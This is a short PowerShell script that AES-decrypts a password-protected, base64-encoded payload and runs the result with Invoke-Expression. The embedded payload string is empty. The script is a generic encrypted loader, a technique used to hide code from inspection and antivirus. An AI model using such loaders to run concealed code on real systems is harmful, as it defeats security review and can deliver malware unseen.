param([string]$d)
if (-not $d) {
    Write-Host "Usage: .\script.ps1 -d <password>" -ForegroundColor Yellow
    exit
}

function Decrypt-Payload($enc, $pwd) {
    $data = [Convert]::FromBase64String($enc)

    $iv = New-Object byte[] 16
    [Array]::Copy($data, 0, $iv, 0, 16)

    $cipher = New-Object byte[] ($data.Length - 16)
    [Array]::Copy($data, 16, $cipher, 0, $cipher.Length)

    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $key = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($pwd))

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = 'CBC'
    $aes.Padding = 'PKCS7'
    $aes.Key = $key
    $aes.IV = $iv

    $ms = New-Object System.IO.MemoryStream
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $aes.CreateDecryptor(), 'Write')
    $cs.Write($cipher, 0, $cipher.Length)
    $cs.FlushFinalBlock()
    $cs.Close()

    return [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
}

$decrypted = Decrypt-Payload -enc '' -pwd $d
Invoke-Expression $decrypted
